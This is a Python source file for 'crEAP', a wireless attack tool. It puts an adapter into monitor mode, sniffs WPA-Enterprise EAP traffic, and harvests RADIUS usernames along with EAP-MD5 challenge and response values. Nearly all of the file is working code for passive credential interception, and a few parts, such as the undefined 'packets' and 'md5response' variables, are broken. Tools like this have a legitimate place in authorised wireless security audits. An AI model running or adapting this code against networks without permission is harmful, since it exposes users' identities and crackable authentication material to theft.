#!/usr/bin/python
#crEAP is a utility which will identify WPA Enterprise Mode Encryption types and if
#insecure protocols are in use, crEAP will harvest Radius usernames and handshakes.
#Author: Snizz
#Requirements:  Should be run as root/sudo.
#
#			   Python Scapy Community (scapy-com) - Dev version of Scapy which supports additional
#			   filters such as EAP types.  Get @ https://bitbucket.org/secdev/scapy-com
#
#			   Airmon-ng, airodump-ng (Aircrack-ng Suite - http://www.aircrack-ng.org/)
#
#			   Screen for terminal managment/ease of launching airodump (requirement for
#			   Promiscuous/Channel hopping to capture the EAPOL packets)
import logging
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
from collections import defaultdict
from scapy.all import *
import sys, argparse
import thread
import subprocess
pcap_file = None
wifiint = None
wifichan = None
parser = argparse.ArgumentParser(description='')
parser.add_argument('-r', '--read', dest='pcap', required=False, help='[OPTIONAL] Read from PCAP file, else live capture is default.')
parser.add_argument('-i', '--interface', dest='interface', required=False, help='[OPTIONAL] Wireless interface to capture.')
parser.add_argument('-c', '--channel', dest='wifichan', required=False, help='[OPTIONAL] Wireless channel to monitor. 2.4/5GHZ spectrums supported so long as your adapter supports it. The ALFA AWUS051NHv2 is recommended for dual band support.')
args = parser.parse_args()
pcap_file = args.pcap
wifiint = args.interface
wifichan = args.wifichan
class bcolors:
	HEADER = '\033[95m'
	OKBLUE = '\033[94m'
	OKGREEN = '\033[92m'
	WARNING = '\033[93m'
	FAIL = '\033[91m'
	ENDC = '\033[0m'
	BOLD = '\033[1m'
	UNDERLINE = '\033[4m'
version = "1.4" # 5GHZ||GTFO
# Got root/sudo?
euid = os.geteuid()
if euid != 0:
	print bcolors.FAIL + "\n[-]"+ bcolors.ENDC + "Script not started as root. Running sudo..."
	args = ['sudo', sys.executable] + sys.argv + [os.environ]
	# the next line replaces the currently-running process with the sudo
	os.execlpe('sudo', *args)
try:  # Python Scapy-Com check (inspiration from EAPEAK/McIntyre)
	from scapy.layers.l2 import eap_types as EAP_TYPES
except ImportError:
	print bcolors.FAIL + "\n[!]"+ bcolors.ENDC +" Scapy-Com not installed, needed for parsing EAPOL packets."
	print bcolors.WARNING + "[-]"+ bcolors.ENDC +" Download:  hg clone https://bitbucket.org/secdev/scapy-com"
	print bcolors.WARNING + "[-]"+ bcolors.ENDC +" Remove:	dpkg --ignore-depends=python-scapy -r python-scapy"
	print bcolors.WARNING + "[-]"+ bcolors.ENDC +" Install:   cd scapy-com && python setup.py install"
	sys.exit(0)
#Prereq checks:
requirement = ['airmon-ng', 'airodump-ng', 'screen']
for r in requirement:
	devnull = open("/dev/null", "w")
	if r == 'screen':
		try:
			subprocess.call([r, "-v"], stdout=devnull)
		except OSError:
			print bcolors.FAIL + "\n[-]"+ bcolors.ENDC + r +" dependancy not detected, exiting."
			sys.exit(0)
	else:
		try:
			subprocess.call([r], stdout=devnull)
		except OSError:
			print bcolors.FAIL + "\n[-]"+ bcolors.ENDC + r +" dependancy not detected, exiting."
			sys.exit(0)
banner = bcolors.OKGREEN + """
                          ___________   _____ ___________
                 __________\_   _____/  /  _  \______    \ 
               _/ ___\_  __ \	__)_   /  /_\  \|     ___/
               \  \___|  | \/       \ /  |   \  \    |
                \___  >__| /_______  /\____|__  /____|
                    \/             \/         \/
  crEAP is a utility which will identify WPA Enterprise Mode Encryption types and if
  insecure protocols are in use, crEAP will harvest usernames and handshakes.
  """ + bcolors.ENDC
print "\n"+banner
print "Version: "+bcolors.OKGREEN +version+bcolors.ENDC
#Check to see if WLAN is in MONITOR mode, if not, set it
md5challenge = {}
requser = {}
USER = {}
USERID = {}
USERNAME = {}
UserList = []
checked = []
#bssids = set(['00:00:00:00:00', 'Null'])
bssids =  defaultdict(list)
bssids.update({'mac':"00:00:00:00:00:00", 'net':'testing'})
def live():
	#Interface Foo
	if wifiint is None:
		print "\n" + bcolors.WARNING + "[-]" + bcolors.ENDC + " Current Wireless Interfaces\n" + bcolors.ENDC
		print subprocess.Popen("iwconfig", shell=True, stdout=subprocess.PIPE).stdout.read()
		subprocess.Popen("screen -X -S crEAP kill", shell=True, stdout=subprocess.PIPE).stdout.read()
		try:
			global adapter
			adapter = raw_input(bcolors.WARNING + "Specify wireless interface: "+ bcolors.FAIL + "      (This will enable MONITOR mode)"+ bcolors.ENDC + " (wlan0, wlan2, etc): ")
		except:
			print "\n" + bcolors.FAIL + "[!]" + bcolors.ENDC + " Issue specifying the wireless interface, exiting.\n"
			sys.exit(0)
	else:
		adapter = wifiint
	if wifichan is None:
		try:
			global channel
			channel = raw_input(bcolors.WARNING + "Specify wireless channel:"+ bcolors.FAIL + " (Default Channel 6. Supports 2.4/5ghz spectrum): ")+ bcolors.ENDC
		except:
			print "\n" + bcolors.FAIL + "[!]" + bcolors.ENDC + " Unable to set channel, exiting.\n"
	else:
		channel = wifichan
	try:
		print bcolors.WARNING + "\n[-]"+ bcolors.ENDC + " Enabling monitor interface and channel..."
		subprocess.Popen("airmon-ng check kill", shell=True, stdout=subprocess.PIPE).stdout.read()
		subprocess.Popen("airmon-ng start "+adapter, shell=True, stdout=subprocess.PIPE).stdout.read()
		adapter=adapter+"mon"
	except:
		print "\n" + bcolors.FAIL + "[!]" + bcolors.ENDC + " Unable to enable MONITOR mode, exiting.\n"
	
	if channel <= 14:
		try:
			subprocess.Popen(['screen -dmS crEAP'], shell=True, stdout=subprocess.PIPE).stdout.read()
			cmd = "stuff $" + "'sudo airodump-ng -c"+channel+" "+adapter+"\n'"
			subprocess.Popen(['screen -r crEAP -X ' + cmd], shell=True, stdout=subprocess.PIPE).stdout.read()
			print "\n" + bcolors.WARNING + "[-]"+ bcolors.ENDC + " Listening in the 2.4GHZ spectrum."
		except:
			print "\n" + bcolors.FAIL + "[!]" + bcolors.ENDC + " Unable to set promiscuous mode, exiting.\n"
	else:
		try:
			subprocess.Popen(['screen -dmS crEAP'], shell=True, stdout=subprocess.PIPE).stdout.read()
			cmd = "stuff $" + "'sudo airodump-ng --band a -c"+channel+" "+adapter+"\n'"
			subprocess.Popen(['screen -r crEAP -X ' + cmd], shell=True, stdout=subprocess.PIPE).stdout.read()
			print "\n" + bcolors.WARNING + "[-]"+ bcolors.ENDC + " Listening in the 5GHZ spectrum."
		except:
			print "\n" + bcolors.FAIL + "[!]" + bcolors.ENDC + " Unable to set promiscuous mode, exiting.\n"

def eapol_header(packet):
	global USERID
	global USER
	global USERNAME
	#packet.show()
	for pkt in packet:
		get_bssid(pkt)
		try:
			if pkt.haslayer(EAP):
					if pkt[EAP].type==1: #Identified an EAP authentication
						USERID=pkt[EAP].id
						if pkt[EAP].code == 2:
							USER=pkt[EAP].identity
					#EAP-MD5 - Credit to EAPMD5crack for logic assistance
					if pkt[EAP].type==4:  #Found EAP-MD5
						EAPID=pkt[EAP].id
						if pkt[EAP].code == 1:
							md5challenge[EAPID]=pkt[EAP].load[1:17]
							network = bssids[pkt.addr2]
							print "\n" + bcolors.OKGREEN + "[!]" + bcolors.ENDC +" EAP-MD5 Authentication Detected"
							print bcolors.OKGREEN + "[-]" + bcolors.ENDC +" BSSID:         " + (network)
							print bcolors.OKGREEN + "[-]" + bcolors.ENDC +" Auth ID:       " + str(USERID)
							print bcolors.OKGREEN + "[-]" + bcolors.ENDC +" User ID:       " + str(USER)
							print bcolors.OKGREEN + "[-]" + bcolors.ENDC +" MD5 Challenge: " + md5challenge[EAPID].encode("hex")
							addtolist(USER)
						elif packets[EAP].code == 2:
							md5response[EAPID]=packets[EAP].load[1:17]
							print bcolors.OKGREEN + "[-]" + bcolors.ENDC +" MD5 Response:  " + md5response[EAPID].encode("hex")
					#EAP-PEAP
					elif pkt[EAP].type==25:  #Found EAP-PEAP
						EAPID=pkt[EAP].id
						if pkt[EAP].code == 2:
							network = bssids[pkt.addr1] #reverse as it is the destination mac (Client->Server Identify)
							print "\n" + bcolors.OKGREEN + "[!]" + bcolors.ENDC +" EAP-PEAP Authentication Detected"
							print bcolors.OKGREEN + "[-]" + bcolors.ENDC +" BSSID:         " + (network)
							print bcolors.OKGREEN + "[-]" + bcolors.ENDC +" Auth ID:       " + str(USERID)
							print bcolors.OKGREEN + "[-]" + bcolors.ENDC +" User ID:       " + str(USER)
							addtolist(USER)
					#EAP-TLS
					elif pkt[EAP].type==1:  #Found EAP-TLS Response Identity
						EAPID=pkt[EAP].id
 						if pkt[EAP].code == 1:
							network = bssids[pkt.addr2]
							USER = str(USER).strip("{}")
							if USER is not '':
								print "\n" + bcolors.OKGREEN + "[!]" + bcolors.ENDC +" EAP-TLS Response ID Detected"
								print bcolors.OKGREEN + "[-]" + bcolors.ENDC +" BSSID:        " + (network)
								print bcolors.OKGREEN + "[-]" + bcolors.ENDC +" Auth ID:      " + str(USERID)
								print bcolors.OKGREEN + "[-]" + bcolors.ENDC +" User ID:      " + str(USER)
								addtolist(USER)
					elif pkt[EAP].type==13:  #Found EAP-TLS
				   		EAPID=pkt[EAP].id
 						if pkt[EAP].code == 2:
							network = bssids[pkt.addr2]
							# print "\n" + bcolors.OKGREEN + "[!]" + bcolors.ENDC +" EAP-TLS Authentication Detected"
		except:
			print "\n" + bcolors.FAIL + "[!]" + bcolors.ENDC + " Something wasn't able to parse correctly, exection will continue.\n"
			#print "\n" + bcolors.FAIL + "[!]" + bcolors.ENDC + " Python Scapy not able to extract EAPOL data, make sure scapy-com is installed which supports EAP types.  (https://bitbucket.org/secdev/scapy-com)\n"
			#sys.exit(0)
def get_bssid(pkt):
	global bssids
	if pkt.haslayer(Dot11):
		if pkt.type==0 and pkt.subtype==8:
			for item in bssids.values():
				if pkt.info in item:
					break
				elif pkt.addr2 in item:
					break
				else:
					bssids.update({pkt.addr2:pkt.info})
def addtolist(USER):
	#if USERNAME not in UserList:
	UserList.append(USER)
	global checked
	checked = []
	for item in UserList:
		if item not in checked:
			checked.append(item)
#Main and EAPOL-HEADER
if pcap_file is not None:
	try:
		print bcolors.WARNING + "\n[-]"+ bcolors.ENDC + " Searching for EAPOL packets from PCAP", pcap_file
		PCAP_EXTRACTED=rdpcap(pcap_file)
		eapol_header(PCAP_EXTRACTED)
	except:
		print "\n" + bcolors.FAIL + "\n[!]" + bcolors.ENDC + " Issue reading PCAP.\n"
		sys.exit(0)
else:
	try:
		live()
		print bcolors.WARNING + "\n[-]"+ bcolors.ENDC + " Sniffing for EAPOL packets on "+adapter+" channel "+channel+"...  "+ bcolors.FAIL + "Ctrl+C to exit" + bcolors.ENDC
		conf.iface = adapter
		sniff(iface=adapter, prn=eapol_header)
		print "\n" + bcolors.FAIL + "\n[!]" + bcolors.ENDC + " User requested interrupt, cleaning up monitor interface and exiting..."
		print bcolors.WARNING + "[-]"+ bcolors.ENDC + " Cleaning up interfaces..."
		subprocess.Popen("screen -X -S crEAP kill", shell=True, stdout=subprocess.PIPE).stdout.read()
		subprocess.Popen("sudo airmon-ng stop "+adapter, shell=True, stdout=subprocess.PIPE).stdout.read()
	except:
		"\n" + bcolors.FAIL + "\n[!]" + bcolors.ENDC + " Issue sniffing packets, ensure python's scapy-com in installed (https://bitbucket.org/secdev/scapy-com).\n"
		sys.exit(0)
print bcolors.OKGREEN + "[-]"+ bcolors.ENDC + " Unique Harvested Users:"
print checked
print "\n"
